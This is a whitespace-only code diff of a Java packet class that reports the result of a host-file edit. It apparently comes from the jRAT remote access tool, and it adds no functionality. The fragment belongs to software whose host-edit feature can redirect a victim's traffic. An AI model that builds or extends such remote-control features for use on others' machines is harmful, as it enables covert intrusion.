@@ -4,11 +4,10 @@ import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
-
 public class Packet39HostEditResult extends AbstractOutgoingPacket {
 
 	private String status;
-	
+
 	public Packet39HostEditResult(String status) {
 		this.status = status;
 	}
